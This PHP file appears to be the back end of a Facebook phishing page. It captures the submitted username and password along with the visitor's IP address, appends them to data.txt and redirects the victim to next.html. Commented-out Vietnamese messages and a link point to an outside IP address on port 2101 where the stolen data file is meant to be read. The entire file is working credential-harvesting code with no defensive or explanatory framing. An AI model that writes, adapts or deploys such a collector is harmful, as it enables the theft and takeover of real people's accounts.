<?php
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

//echo 'User Real IP - '.getUserIpAddr();

//echo "web đã lưu tài khoản của bạn<br>";
//echo "bạn vui lòng vô đây để xem tài khoản của bạn";

//echo '<a href="http://14.162.45.7:2101/phsing%20fb/data.txt">  Click here</a>';
//header(“Location:http://14.162.45.7:2101”);
$data=$_POST['username'];
$data2=$_POST['password'];
$ip = 'User Real IP - '.getUserIpAddr();
$fp = fopen('data.txt', 'a');
fwrite($fp, $ip);
fwrite($fp, " ");
fwrite($fp, $data);
fwrite($fp, ": ");
fwrite($fp, $data2);
fwrite($fp, '
');
header("Location: next.html");
fclose($fp);

?>